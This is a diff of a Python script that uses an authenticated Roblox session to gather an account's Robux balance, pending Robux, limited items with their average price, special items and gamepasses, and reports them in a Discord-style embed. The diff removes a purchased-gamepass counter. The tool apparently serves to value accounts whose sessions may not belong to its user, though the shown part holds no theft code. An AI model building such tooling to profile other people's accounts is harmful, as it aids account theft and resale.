@@ -202,7 +202,6 @@ def main():
         premium = False
         games_data = {}
         special_owned = {}
-        gamepasses_bought = 0
 
         if auth_res.status_code == 200:
             auth_data = auth_res.json()
@@ -237,7 +236,7 @@ def main():
                     elif isinstance(val, dict):
                         premium = val.get("isMember", False)
 
-                # 2. Resilient Collectibles Fetch (Avoids false 'Private' flags)
+                # 2. Resilient Collectibles Fetch
                 collectibles = []
                 col_cursor = ""
                 col_failed = False
@@ -266,18 +265,7 @@ def main():
                     lim_count = len(collectibles)
                     rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
 
-                # 3. Gamepasses bought count (fast single page)
-                try:
-                    t_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transactions", params={"transactionType": "Purchase", "limit": 50})
-                    if t_res.get("status") == 200:
-                        for item in t_res["data"].get("data", []):
-                            details = item.get("details")
-                            if details and details.get("type") == "GamePass":
-                                gamepasses_bought += 1
-                except Exception:
-                    pass
-
-                # 4. Special items check
+                # 3. Special items check
                 for item_name, asset_id in SPECIAL_ASSETS.items():
                     asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                     special_owned[item_name] = bool(asset_res.get("status") == 200 and asset_res["data"].get("data"))
@@ -285,7 +273,7 @@ def main():
                 # Fetch owned gamepasses once
                 owned_gamepasses = get_fast_owned_gamepasses(session, user_id)
 
-                # 5. Parallel game processing using ThreadPoolExecutor
+                # 4. Parallel game processing using ThreadPoolExecutor
                 with ThreadPoolExecutor(max_workers=3) as executor:
                     futures = {
                         executor.submit(process_single_game, session, user_id, g_name, u_id, owned_gamepasses): g_name
@@ -316,7 +304,7 @@ def main():
             "thumbnail": {"url": avatar_url},
             "fields": [
                 {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
-                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Total Passes Bought: {gamepasses_bought}\n+ Premium: {premium}\n```", "inline": False},
+                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Premium: {premium}\n```", "inline": False},
                 {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux_display}\nPending: {pending_display}\n```", "inline": True},
                 {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap_display}\nLimiteds: {lim_count}\n```", "inline": True},
                 {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
